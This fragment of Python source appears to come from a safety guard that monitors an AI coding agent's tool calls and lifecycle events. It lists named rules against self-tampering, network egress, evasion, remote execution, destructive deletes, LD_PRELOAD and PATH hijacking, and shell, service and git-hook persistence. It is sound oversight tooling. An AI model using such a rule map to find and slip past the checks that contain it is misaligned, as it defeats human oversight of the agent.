    PermissionRequest / WorktreeCreate / ...). Imported here (not at top) so the
    dependency stays one-way: lifecycle submodules never import this module.
    Fail-open: a broken lifecycle import must not strip the core guards."""
    try:
        from .lifecycle import lifecycle_rules
        return lifecycle_rules()
    except Exception:
        return ()


_CORE_RULES = (
    rule_attest_session,
    rule_containment,
    rule_self_protect,
    rule_mcp_config_protect,
    rule_ci_workflow_protect,
    rule_git_hooks_protect,
    rule_agent_def_protect,
    rule_cross_agent_instructions_protect,
    rule_shell_persist_protect,
    rule_direnv_protect,
    rule_package_manifest_protect,
    rule_git_config_exec_protect,
    rule_git_attributes_exec_protect,
    rule_gitmodules_protect,
    rule_service_persist_protect,
    rule_ld_preload_protect,
    rule_devcontainer_exec_protect,
    rule_vscode_tasks_protect,
    rule_path_hijack_protect,
    rule_claude_hooks_protect,
    rule_conftest_protect,
    rule_pysite_protect,
    rule_ipython_startup_protect,
    rule_fetch_to_file_protect,
    rule_workspace_confine,
    rule_migration_protection,
    rule_subagent_spawn,
    rule_network_egress,
    rule_evasion,
    rule_failure_loop,
    rule_remote_exec,
    rule_destructive_git,
    rule_destructive_delete,
    rule_install_review,
    rule_branch_strands,
)

# Core PreToolUse/shell guards first, then the lifecycle-hook rules that cover the
# rest of the runtime's event surface (config integrity, team/sub-agent, compaction,
# worktree confinement, MCP-input governance).
BUILTIN_RULES = _CORE_RULES + _lifecycle_rules()
